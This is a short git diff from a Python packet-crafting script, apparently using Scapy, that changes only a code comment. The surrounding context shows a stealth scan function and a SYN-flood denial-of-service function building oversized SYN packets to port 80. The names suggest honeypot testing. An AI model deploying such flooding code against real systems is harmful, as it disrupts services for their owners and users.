@@ -35,7 +35,7 @@ def preferm_stealth_scan(hp_device_ip,hp_device_port):
         
 def dos_SYN_Flooding_Attack(dst_ip):
 	hp_ip = IP(dst=dst_ip)
-        #set src address to a spoofed random IP address in the private network range 
+        #set src address to a random IP address in the private network range 
         hp_tcp = TCP(sport=RandShort(), dport=80, flags="S")
         hp_raw = Raw(b"X" * 10000) 
         dos_packet = hp_ip / hp_tcp / hp_raw
